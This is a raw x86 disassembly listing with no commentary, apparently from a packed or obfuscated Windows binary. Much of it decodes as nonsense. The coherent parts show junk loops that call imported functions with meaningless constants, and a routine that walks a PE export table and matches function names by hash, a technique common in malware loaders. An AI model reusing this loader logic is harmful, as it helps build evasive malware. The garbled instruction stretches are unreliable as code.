  419f4e:	lds    eax,FWORD PTR [ebp+0x4b]
  419f51:	out    0xf,eax
  419f53:	pop    ebp
  419f54:	and    al,0xa
  419f56:	stos   BYTE PTR es:[edi],al
  419f57:	sub    DWORD PTR [ebx-0x653a5544],0xffffff83
  419f5e:	inc    eax
  419f5f:	dec    ebp
  419f60:	add    BYTE PTR [esp+eiz*4-0x4f5a8e4],cl
  419f67:	mov    ah,0x4d
  419f69:	sub    al,0xe8
  419f6b:	(bad)  
  419f6c:	mov    esp,0x3275e4cd
  419f71:	mov    esi,0xe56fc080
  419f76:	add    DWORD PTR [eax-0x55],edi
  419f79:	aaa    
  419f7a:	sbb    ah,bh
  419f7c:	out    dx,al
  419f7d:	pop    ds
  419f7e:	loope  0x419f49
  419f80:	or     dl,BYTE PTR [ebx]
  419f82:	mov    ah,ah
  419f84:	ins    BYTE PTR es:[edi],dx
  419f85:	call   0xa017:0x5c813d7
  419f8c:	mov    esp,ecx
  419f8e:	repz sub ebp,DWORD PTR [esi]
  419f91:	shl    DWORD PTR [esi],cl
  419f93:	int    0x1
  419f95:	inc    esi
  419f96:	out    0xb1,eax
  419f98:	sbb    al,0xf6
  419f9a:	mov    WORD PTR [ebp-0x16ed9b5e],?
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42a7c5,0x42a761
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x71
  419fdd:	or     eax,0xffffff83
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x419f85
  419fe9:	or     esi,DWORD PTR [edx+0x58947f7f]
  419fef:	es es push ds
  419ff2:	sbb    DWORD PTR [ebp-0x43],ebp
  419ff5:	mov    edx,0x652aabdd
  419ffa:	arpl   WORD PTR [eax+0x61d89717],ax
  41a000:	push   0xffffffc9
  41a002:	inc    eax
  41a003:	out    0x21,eax
  41a005:	inc    eax
  41a006:	in     al,0xe0
  41a008:	cmp    al,0x33
  41a00a:	dec    edi
  41a00b:	ds jno 0x41a032
  41a00e:	je     0x419fcb
  41a010:	push   ebx
  41a011:	pop    eax
  41a012:	cmp    edx,ebx
  41a014:	retf   
  41a015:	js     0x41a033
  41a017:	jmp    0x41a000
  41a019:	inc    edx
  41a01a:	jg     0x419fdf
  41a01c:	mov    edi,0x226e63a2
  41a021:	adc    DWORD PTR [ebx+0x0],ebp
  41a024:	adc    eax,0x77cabe53
  41a029:	cli    
  41a02a:	cdq    
  41a02b:	mov    bl,0xb5
  41a02d:	mul    BYTE PTR [edx]
  41a02f:	push   es
  41a030:	clc    
  41a031:	adc    BYTE PTR [eax],dh
  41a033:	fistp  WORD PTR [eax+0x30]
  41a036:	mov    ebx,edx
  41a038:	js     0x41a097
  41a03a:	stos   DWORD PTR es:[edi],eax
  41a03b:	mov    al,0x76
  41a03d:	add    ecx,edx
  41a03f:	dec    ecx
  41a040:	cs xor eax,0x3416886e
  41a046:	cmc    
  41a047:	pop    ss
  41a048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a049:	sub    esi,0x911557bb
  41a04f:	shl    DWORD PTR [edi],0x35
  41a052:	mov    dl,0x3a
  41a054:	dec    eax
  41a055:	cs lahf 
  41a057:	popa   
  41a058:	push   eax
  41a059:	pop    edx
  41a05a:	sahf   
  41a05b:	je     0x41a0a7
  41a05d:	mov    bh,0x99
  41a05f:	adc    edi,DWORD PTR [ebp-0x3d]
  41a062:	mov    esi,0xd0ff212b
  41a067:	test   al,0xe6
  41a069:	retf   
  41a06a:	xchg   ebx,eax
  41a06b:	leave  
  41a06c:	adc    esp,DWORD PTR [edx+0x6]
  41a06f:	loop   0x41a094
  41a071:	xchg   esp,eax
  41a072:	pop    ecx
  41a073:	mov    es,WORD PTR [edi+0x80184c5]
  41a079:	mov    DWORD PTR [ebp-0xb],esi
  41a07c:	clc    
  41a07d:	inc    eax
  41a07e:	loop   0x41a016
  41a080:	ins    BYTE PTR es:[edi],dx
  41a081:	loope  0x41a0f4
  41a083:	cdq    
  41a084:	and    ecx,DWORD PTR [esp+eax*1]
  41a087:	das    
  41a088:	cmc    
  41a089:	imul   eax,ebp,0xffffffb2
  41a08c:	out    0x14,al
  41a08e:	add    ebx,ebx
  41a090:	adc    cl,BYTE PTR [edi]
  41a092:	sub    bh,0xbd
  41a095:	cli    
  41a096:	stos   DWORD PTR es:[edi],eax
  41a097:	test   DWORD PTR [esi],esi
  41a099:	sub    al,0x38
  41a09b:	pop    eax
  41a09c:	pop    ebp
  41a09d:	mov    dl,0x5a
  41a09f:	or     BYTE PTR [esi],ah
  41a0a1:	stos   DWORD PTR es:[edi],eax
  41a0a2:	push   ebx
  41a0a3:	inc    esi
  41a0a4:	xchg   ebp,eax
  41a0a5:	push   edi
  41a0a6:	sub    BYTE PTR [ecx+0x5],dh
  41a0a9:	pop    esi
  41a0aa:	mov    dl,0x24
  41a0ac:	mov    ch,0xf8
  41a0ae:	jne    0x41a0c9
  41a0b0:	cmc    
  41a0b1:	aad    0x5d
  41a0b3:	jno    0x41a129
  41a0b5:	icebp  
  41a0b6:	sbb    BYTE PTR [ecx+0x6e48e189],ah
  41a0bc:	xlat   BYTE PTR ds:[ebx]
  41a0bd:	inc    eax
  41a0be:	inc    ebx
  41a0bf:	sahf   
  41a0c0:	ret    
  41a0c1:	jne    0x41a10a
  41a0c3:	mov    ?,WORD PTR [edi+ebp*8-0x117b2e32]
  41a0ca:	add    DWORD PTR [ebp+0x1cf22836],edi
  41a0d0:	stos   DWORD PTR es:[edi],eax
  41a0d1:	adc    al,0x92
  41a0d3:	push   ebp
  41a0d4:	lods   al,BYTE PTR ds:[esi]
  41a0d5:	pop    esi
  41a0d6:	push   edx
  41a0d7:	scas   al,BYTE PTR es:[edi]
  41a0d8:	or     eax,0x29033d93
  41a0dd:	pop    esi
  41a0de:	xchg   ecx,eax
  41a0df:	mov    ecx,0xf9c021b4
  41a0e4:	xchg   edi,eax
  41a0e5:	pop    edi
  41a0e6:	lock lahf 
  41a0e8:	ror    DWORD PTR [ebx],1
  41a0ea:	inc    eax
  41a0eb:	scas   eax,DWORD PTR es:[edi]
  41a0ec:	adc    cl,BYTE PTR [edi]
  41a0ee:	shl    ch,0xd3
  41a0f1:	cmc    
  41a0f2:	(bad)  
  41a0f3:	jmp    0x2c0845be
  41a0f8:	cwde   
  41a0f9:	xchg   edx,eax
  41a0fa:	lods   eax,DWORD PTR ds:[esi]
  41a0fb:	les    edx,FWORD PTR [edi+0x39992d05]
  41a101:	ror    esi,cl
  41a103:	out    dx,eax
  41a104:	mov    bl,0x1a
  41a106:	imul   edx,edi,0xcd9cae60
  41a10c:	call   0x2aac:0xf22f4289
  41a113:	dec    edx
  41a114:	xchg   esi,eax
  41a115:	into   
  41a116:	cmp    al,0x5f
  41a118:	mov    ecx,0x67a94392
  41a11d:	fdivp  st(1),st
  41a11f:	dec    edi
  41a120:	in     eax,dx
  41a121:	mov    ecx,ecx
  41a123:	shr    DWORD PTR ds:0x8902cd0e,0x85
  41a12a:	sub    BYTE PTR [ebx+0x4d],dl
  41a12d:	push   ebp
  41a12e:	shl    DWORD PTR [eax+0x2f34fe3],cl
  41a134:	push   es
  41a135:	clc    
  41a136:	xor    BYTE PTR [edx-0x58],0x7
  41a13a:	adc    BYTE PTR [eax+0xae959],al
  41a140:	test   DWORD PTR [esi+0x20],ebp
  41a143:	sub    dh,BYTE PTR [edx+0x5f]
  41a146:	sahf   
  41a147:	mov    eax,ds:0x72f5d7a7
  41a14c:	aaa    
  41a14d:	jecxz  0x41a155
  41a14f:	pop    ecx
  41a150:	adc    eax,0xc057df34
  41a155:	sub    ebp,DWORD PTR [esp+esi*4-0x6]
  41a159:	jmp    0x41a163
  41a15b:	mov    bh,0x2
  41a15d:	test   eax,0x51edc1ee
  41a162:	mov    dl,bl
  41a164:	(bad)  
  41a165:	xor    dh,bh
  41a167:	int    0x95
  41a169:	mov    ah,0xcd
  41a16b:	aaa    
  41a16c:	fstp   DWORD PTR [esp+ecx*4-0x5f]
  41a170:	jmp    0xee848f83
  41a175:	jmp    0xc9ec:0xdf9a37e3
  41a17c:	jmp    0x15cc:0xcc833e69
  41a183:	jno    0x41a172
  41a185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a186:	push   0x98abd99c
  41a18b:	xor    BYTE PTR [ecx-0xbafbc4e],ah
  41a191:	setp   BYTE PTR [eax-0x49]
  41a195:	(bad)  
  41a196:	in     eax,0x94
  41a198:	arpl   WORD PTR [ebx],sp
  41a19a:	mov    al,0xb4
  41a19c:	call   0x9c1f:0x31ddde67
  41a1a3:	adc    BYTE PTR [edx+0x23],bl
  41a1a6:	fmul   DWORD PTR [edi-0xbc944ff]
  41a1ac:	in     al,dx
  41a1ad:	gs adc al,0x5d
  41a1b0:	mov    BYTE PTR [ecx-0x648dce16],ah
  41a1b6:	inc    edi
  41a1b7:	xor    al,0x99
  41a1b9:	fs stos DWORD PTR es:[edi],eax
  41a1bb:	cdq    
  41a1bc:	js     0x41a17f
  41a1be:	std    
  41a1bf:	xchg   dl,dh
  41a1c1:	adc    BYTE PTR [ebx],bl
  41a1c3:	xor    BYTE PTR [ecx-0x1f1d7659],0xfb
  41a1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1cb:	cmp    eax,0x9dc8d816
  41a1d0:	dec    eax
  41a1d1:	sub    al,0x96
  41a1d3:	sbb    DWORD PTR [ecx],ebx
  41a1d5:	cmp    al,0x5a
  41a1d7:	sahf   
  41a1d8:	cmc    
  41a1d9:	and    ebp,DWORD PTR [esi-0x212cd89b]
  41a1df:	in     al,0x4c
  41a1e1:	imul   esi,DWORD PTR [ebp+0x3c],0xe25fd147
  41a1e8:	dec    eax
  41a1e9:	dec    eax
  41a1ea:	or     dl,BYTE PTR [edi+0x688f0ccd]
  41a1f0:	iret   
  41a1f1:	icebp  
  41a1f2:	scas   al,BYTE PTR es:[edi]
  41a1f3:	leave  
  41a1f4:	adc    BYTE PTR [edi-0x1455ad9d],bl
  41a1fa:	push   esi
  41a1fb:	(bad)  
  41a1fc:	cmp    al,0x9e
  41a1fe:	mov    WORD PTR [edi],?
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2fc
  41a293:	push   es
  41a294:	push   edx
  41a295:	jecxz  0x41a22f
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2d1
  41a29f:	adc    ch,al
  41a2a1:	fwait
  41a2a2:	ret    
  41a2a3:	dec    eax
  41a2a4:	mov    ah,0xa
  41a2a6:	sahf   
  41a2a7:	ficom  DWORD PTR [ebx+edx*4-0x2e49ac0a]
  41a2ae:	aas    
  41a2af:	inc    ecx
  41a2b0:	inc    esi
  41a2b1:	in     eax,dx
  41a2b2:	jns    0x41a298
  41a2b4:	sbb    al,0x18
  41a2b6:	pop    ebx
  41a2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b8:	inc    edx
  41a2b9:	sub    dh,dh
  41a2bb:	popa   
  41a2bc:	xchg   edx,eax
  41a2bd:	fisttp WORD PTR [edi]
  41a2bf:	pop    edi
  41a2c0:	mov    ecx,0x693a9485
  41a2c5:	pusha  
  41a2c6:	loopne 0x41a2f7
  41a2c8:	jns    0x41a321
  41a2ca:	mov    ah,0x59
  41a2cc:	pop    ebp
  41a2cd:	sahf   
  41a2ce:	push   ss
  41a2cf:	popf   
  41a2d0:	sub    DWORD PTR [eax-0x189acce2],0x37c77249
  41a2da:	lods   al,BYTE PTR ds:[esi]
  41a2db:	inc    ecx
  41a2dc:	sub    BYTE PTR [ebp+0x7a],dl
  41a2df:	sar    dl,cl
  41a2e1:	hlt    
  41a2e2:	retf   0x1e70
  41a2e5:	inc    esp
  41a2e6:	cld    
  41a2e7:	es aaa 
  41a2e9:	in     eax,0x64
  41a2eb:	lea    esp,[esi]
  41a2ed:	add    eax,0x46cfb997
  41a2f2:	add    ecx,DWORD PTR [edx+0xa]
  41a2f5:	dec    edx
  41a2f6:	mov    DWORD PTR [eax-0x70333dd9],ecx
  41a2fc:	cmp    dl,BYTE PTR [edx-0x51]
  41a2ff:	dec    edx
  41a300:	not    DWORD PTR [esi-0x23]
  41a303:	fmul   QWORD PTR [eax]
  41a305:	sub    eax,0x5fb2f11e
  41a30a:	mov    BYTE PTR [ebx*4-0x4cbba0af],al
  41a311:	in     al,0xde
  41a313:	les    edi,FWORD PTR [eax+0x41]
  41a316:	nop
  41a317:	ret    0xfa17
  41a31a:	push   eax
  41a31b:	scas   eax,DWORD PTR es:[edi]
  41a31c:	les    esi,FWORD PTR [ebp+0x5b]
  41a31f:	xor    DWORD PTR [edi+0x4fab9974],eax
  41a325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a326:	(bad)  
  41a327:	mov    bl,0x13
  41a329:	es adc edx,ecx
  41a32c:	cmp    bl,dh
  41a32e:	jmp    0x41a323
  41a330:	frstor [ebx+0x1151cd96]
  41a336:	jns    0x41a376
  41a338:	xchg   esp,eax
  41a339:	gs in  al,0xe5
  41a33c:	icebp  
  41a33d:	add    DWORD PTR [eax+eax*2-0x1e],eax
  41a341:	push   edx
  41a342:	(bad)  
  41a343:	loop   0x41a2c8
  41a345:	int3   
  41a346:	(bad)  
  41a347:	adc    eax,0x50d6f237
  41a34c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a34d:	pop    ebx
  41a34e:	popa   
  41a34f:	lea    edx,[ebp-0x3e5f980d]
  41a355:	pop    ecx
  41a356:	jo     0x41a310
  41a358:	in     al,dx
  41a359:	xor    BYTE PTR [edx],bl
  41a35b:	or     ah,BYTE PTR [edx+0x16]
  41a35e:	xchg   edi,eax
  41a35f:	lea    esp,ds:0x532cd631
  41a365:	sub    eax,0x133e5272
  41a36a:	and    eax,esp
  41a36c:	arpl   WORD PTR [esp+edi*4],dx
  41a36f:	sub    DWORD PTR [ecx-0x20],0x5084ac45
  41a376:	mov    dl,0xd3
  41a378:	es inc edi
  41a37a:	dec    esi
  41a37b:	scas   eax,DWORD PTR es:[edi]
  41a37c:	push   es
  41a37d:	mov    ebp,0x4cbbc67e
  41a382:	in     al,dx
  41a383:	sbb    BYTE PTR [esi-0x29da7719],dh
  41a389:	mov    esi,0x660d8b80
  41a38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a390:	mov    ebx,esi
  41a392:	push   0xffffffce
  41a394:	lahf   
  41a395:	sub    ebp,esp
  41a397:	push   edi
  41a398:	jp     0x41a322
  41a39a:	inc    esi
  41a39b:	inc    ecx
  41a39c:	or     al,0x9b
  41a39e:	not    BYTE PTR [eax+ebp*4-0x24]
  41a3a2:	fcmovu st,st(3)
  41a3a4:	in     eax,dx
  41a3a5:	jmp    0x4f50cda1
  41a3aa:	cld    
  41a3ab:	jb     0x41a424
  41a3ad:	in     al,dx
  41a3ae:	xchg   ebx,eax
  41a3af:	sbb    eax,DWORD PTR [edi]
  41a3b1:	inc    edi
  41a3b2:	mov    ebx,0x12cda527
  41a3b7:	adc    BYTE PTR [esi],0x47
  41a3ba:	mov    ds:0x31e01aa3,al
  41a3bf:	std    
  41a3c0:	enter  0x5013,0xb4
  41a3c4:	cmc    
  41a3c5:	pop    edx
  41a3c6:	or     edi,edi
  41a3c8:	mov    gs,WORD PTR [esi-0x200d7566]
  41a3ce:	push   ecx
  41a3cf:	or     al,0x41
  41a3d1:	icebp  
  41a3d2:	popf   
  41a3d3:	mov    ecx,0xe8973271
  41a3d8:	into   
  41a3d9:	dec    esp
  41a3da:	or     edi,DWORD PTR [edx+eax*8+0x3a9906ec]
  41a3e1:	lea    edx,[edx+0x274171d]
  41a3e7:	daa    
  41a3e8:	sub    al,0x3b
  41a3ea:	sub    bh,BYTE PTR [ebx-0x63]
  41a3ed:	jbe    0x41a442
  41a3ef:	pop    edx
  41a3f0:	jp     0x41a3b1
  41a3f2:	ins    DWORD PTR es:[edi],dx
  41a3f3:	xchg   esp,eax
  41a3f4:	and    dh,ah
  41a3f6:	and    dl,BYTE PTR [ecx-0x47]
  41a3f9:	aaa    
  41a3fa:	jne    0x41a3d2
  41a3fc:	data16 fist DWORD PTR [edx-0x56]
  41a400:	or     eax,0x609bee84
  41a405:	jecxz  0x41a3b9
  41a407:	data16 fucom st(6)
  41a40a:	mov    dl,0x62
  41a40c:	mov    edx,0x2eecdd04
  41a411:	and    eax,0x1f7dc0bd
  41a416:	cs jge 0x41a42f
  41a419:	gs jae 0x41a48e
  41a41c:	(bad)  
  41a41e:	in     eax,0x93
  41a420:	je     0x41a3d1
  41a422:	fcomp  QWORD PTR [edx-0x42cccb8]
  41a428:	jnp    0x41a404
  41a42a:	xor    BYTE PTR [eax+0x186e6695],dh
  41a430:	jbe    0x41a3e6
  41a432:	sti    
  41a433:	pop    esp
  41a434:	lahf   
  41a435:	shl    DWORD PTR [edi-0x60],cl
  41a438:	sub    BYTE PTR [edi+0x25],dl
  41a43b:	add    eax,0x8ed2701a
  41a440:	xchg   ebx,eax
  41a441:	dec    eax
  41a442:	lahf   
  41a443:	push   es
  41a444:	out    0x83,al
  41a446:	(bad)  
  41a447:	jae    0x41a463
  41a449:	retf   
  41a44a:	sub    DWORD PTR [eax-0x7af464bd],ebp
  41a450:	jmp    0x41a3fb
  41a452:	in     eax,dx
  41a453:	push   ss
  41a454:	(bad)  
  41a455:	push   0x7b
  41a457:	sub    al,0xbd
  41a459:	nop
  41a45a:	inc    esi
  41a45b:	into   
  41a45c:	pushf  
  41a45d:	xor    ecx,DWORD PTR [esi]
  41a45f:	or     esi,edx
  41a461:	aas    
  41a462:	mov    ebp,0xd78876fc
  41a467:	call   0x6d2a:0xfd5375be
  41a46e:	je     0x41a469
  41a470:	test   DWORD PTR [ecx-0x4f],ebp
  41a473:	mov    ds:0x9c08c1b1,eax
  41a478:	jns    0x41a438
  41a47a:	das    
  41a47b:	sub    esp,DWORD PTR [edx+0x42d99d36]
  41a481:	aas    
  41a482:	xor    al,0x9d
  41a484:	outs   dx,DWORD PTR ds:[esi]
  41a485:	cwde   
  41a486:	(bad)  
  41a487:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a489:	rcr    dh,cl
  41a48b:	dec    ebx
  41a48c:	ror    BYTE PTR [ebp+0x1ebfcfe],1
  41a492:	xor    DWORD PTR [esi+0xd],esi
  41a495:	out    dx,al
  41a496:	in     al,dx
  41a497:	les    edx,FWORD PTR [esi+0x37c4e5c]
  41a49d:	mov    bh,dl
  41a49f:	adc    eax,0x8add477c
  41a4a4:	out    0x37,al
  41a4a6:	ins    BYTE PTR es:[edi],dx
  41a4a7:	xor    BYTE PTR [ebx],dl
  41a4a9:	out    0x7e,eax
  41a4ab:	ds inc esi
  41a4ad:	jno    0x95f31c02
  41a4b3:	mov    cl,0x11
  41a4b5:	add    eax,0xc7ec4589
  41a4ba:	add    eax,0x42a75d
  41a4bf:	sbb    BYTE PTR [eax],al
  41a4c1:	add    BYTE PTR [eax],al
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	add    cl,BYTE PTR [edx-0x284ff3eb]
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a659
  41a69b:	aam    0x60
  41a69d:	aad    0x89
  41a69f:	mov    ds:0x443732d5,eax
  41a6a4:	xchg   ebx,eax
  41a6a5:	lods   al,BYTE PTR ds:[esi]
  41a6a6:	aad    0xb6
  41a6a8:	(bad)  
  41a6aa:	mov    esp,0xbb938d9f
  41a6af:	jp     0x41a659
  41a6b1:	or     al,0xcc
  41a6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6b4:	pop    eax
  41a6b5:	jns    0x41a6d1
  41a6b7:	mov    ah,0x56
  41a6b9:	ss jb  0x41a712
  41a6bc:	sub    al,0x13
  41a6be:	mov    ebp,0x3849837f
  41a6c3:	and    al,0x6e
  41a6c5:	xlat   BYTE PTR ds:[ebx]
  41a6c6:	xchg   edi,eax
  41a6c7:	imul   dl
  41a6c9:	(bad)  
  41a6ca:	cmp    ch,ah
  41a6cc:	jae    0x41a711
  41a6ce:	call   0xc761:0xd108c9ff
  41a6d5:	mov    BYTE PTR [ecx+0x74cd64ad],ah
  41a6db:	mov    ebx,0x5e608b1b
  41a6e0:	pop    ebp
  41a6e1:	xchg   esi,eax
  41a6e2:	lea    eax,[ebp-0x3]
  41a6e5:	mov    ds:0x5478b626,eax
  41a6ea:	retf   
  41a6eb:	das    
  41a6ec:	dec    eax
  41a6ed:	and    eax,0x711a74f7
  41a6f2:	pop    ebp
  41a6f3:	loopne 0x41a73e
  41a6f5:	ret    0xa2b7
  41a6f8:	or     eax,0x15207d02
  41a6fd:	ret    0x3118
  41a700:	test   eax,0x38ed3ac1
  41a705:	std    
  41a706:	add    dl,BYTE PTR [edi]
  41a708:	arpl   WORD PTR [edi+0x67c11552],si
  41a70e:	jnp    0x41a6f1
  41a710:	sahf   
  41a711:	pinsrw mm3,WORD PTR [eax],0x96
  41a715:	cmp    DWORD PTR [esi],0x38274089
  41a71b:	cwde   
  41a71c:	ret    
  41a71d:	push   ebx
  41a71e:	imul   edi
  41a720:	jg     0x41a6ed
  41a722:	imul   ebp,DWORD PTR [eax-0x67b16fda],0xbc855577
  41a72c:	or     cl,bl
  41a72e:	xor    eax,0xd03eef77
  41a733:	push   0xffffffe7
  41a735:	xor    ch,BYTE PTR [esi+0x5c]
  41a738:	xchg   BYTE PTR [edi+0x45],bl
  41a73b:	push   esi
  41a73c:	push   ss
  41a73d:	dec    esp
  41a73e:	(bad)  
  41a73f:	cwde   
  41a740:	jl     0x41a77d
  41a742:	adc    edi,DWORD PTR [edx-0x51]
  41a745:	push   es
  41a746:	and    DWORD PTR ds:0x165ee3f1,ecx
  41a74c:	mov    edi,DWORD PTR [esi]
  41a74e:	mov    esi,0x5d2b52d0
  41a753:	push   ebp
  41a754:	ja     0x41a6dd
  41a756:	shr    BYTE PTR [ebx-0x62],cl
  41a759:	push   ebp
  41a75a:	add    eax,0x36e9f735
  41a75f:	imul   edi,ecx,0x5637c30e
  41a765:	push   DWORD PTR [eax+0x6a]
  41a768:	inc    esp
  41a769:	pusha  
  41a76a:	out    dx,eax
  41a76b:	pop    ebp
  41a76c:	jmp    0x41a7c0
  41a76e:	push   edi
  41a76f:	ror    DWORD PTR ds:0x3dc2e2a8,0xcc
  41a776:	mov    DWORD PTR ds:0xa516ceef,0xe9bb77c9
  41a780:	jge    0x41a76d
  41a782:	jne    0x41a7fd
  41a784:	test   DWORD PTR [esp+eax*4-0x5a],ebp
  41a788:	(bad)  
  41a78a:	dec    ecx
  41a78b:	xchg   ebx,eax
  41a78c:	push   esp
  41a78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a78e:	dec    esi
  41a78f:	in     al,dx
